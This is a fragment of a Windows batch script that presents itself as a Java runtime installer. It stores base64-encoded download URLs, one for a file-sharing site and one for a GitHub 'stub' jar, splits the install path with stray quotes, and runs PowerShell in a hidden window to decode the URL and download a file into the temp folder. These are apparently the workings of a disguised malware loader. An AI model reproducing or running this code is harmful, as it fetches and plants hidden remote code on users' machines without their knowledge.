...
:install_java
set "encodedJavaUrl=aHR0cHM6Ly9maWxldHJhbnNmZXIuaW8vZGF0YS1wYWNrYWdlL2liNGdEbFlwL2Rvd25sb2Fk"
set "output=%TEMP%\jre1.8.0_361.zip"
set "installDir=%USERPROFILE%\Ja"v"a\jre1.8.0_361"

powershell -WindowStyle Hidden -Command "$javaUrl=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%encodedJavaUrl%')); (New-Object System.Net.WebClient).DownloadFile($javaUrl, '%output%')"
...
set "encodedJarUrl=aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbi1pcy10cmFzaC9zdHViL3Jhdy9yZWZzL21haW4vSmF2YS5qYXI="
